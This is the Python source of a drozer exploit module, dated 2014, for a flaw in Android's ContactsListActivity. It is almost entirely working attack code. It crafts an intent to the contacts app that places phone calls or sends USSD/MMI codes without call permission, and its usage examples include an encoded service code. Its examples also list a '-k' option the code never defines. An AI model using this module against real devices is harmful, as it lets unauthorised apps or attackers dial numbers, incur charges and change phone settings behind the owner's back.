from drozer import android
from drozer.modules import common, Module

class callme2(Module):

    name = "Exploit CVE-2014-N/A to conduct phone calls or send special codes."
    description = """
    Bug in ContactsListActivity is abused to conduct phone calls or send special codes

    CVE-2014-N/A

    http://www.curesec.com
    by Curesec Research Team security@curesec.com

    """
    examples = """
    dz> run exploit.badauth.callme2 -t 31337
    dz> run exploit.badauth.callme2 -c *%2343%23
    dz> run exploit.badauth.callme2 -k
    """
    author = "security@curesec.com"
    date = "2014-07-04"
    license = "BSD (3-clause)"
    path = ["exploit", "badauth"]
    permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]

    def add_arguments(self, parser):
        parser.add_argument("-t", "--telephone", default=None, help="specify the number to call")
        parser.add_argument("-c", "--code", default=None, help="USSD/MMI code, Attention! Use (percentage char)23 for encoded #")

    def execute(self, arguments):

        if arguments.code != None and arguments.telephone != None:
            self.stderr.write("Please specify only -t or -c\n")
            return 

        if arguments.code == None and arguments.telephone == None:
            self.stderr.write("Please specify -t or -c\n")
            return

        self.stdout.write("[+] Exploiting CVE-2014-N/A\n")

        if arguments.telephone != None:
            #set action as CALL
            act = "android.provider.Contacts.SEARCH_SUGGESTION_DIAL_NUMBER_CLICKED"

            #add the prefix
            data = "tel:%s" % arguments.telephone
            self.stdout.write("[+] Dialing: %s\n" % arguments.telephone)

        elif arguments.code != None:
            #set action as CALL
            act = "android.provider.Contacts.SEARCH_SUGGESTION_DIAL_NUMBER_CLICKED"

            #add the prefix
            data = "tel:%s" % arguments.code
            self.stdout.write("[+] Sending code: %s\n" % arguments.code)

        else:
            self.stdout.write("[-] Something went wrong.\n")
            return


        #build the intent
        intent = android.Intent(action=act, data_uri=data, component=['com.android.contacts','com.android.contacts.ContactsListActivity'],flags=['ACTIVITY_NEW_TASK'])

        if intent.isValid():
            self.getContext().startActivity(intent.buildIn(self))
        else:
            self.stderr.write("[-] Invalid!\n")
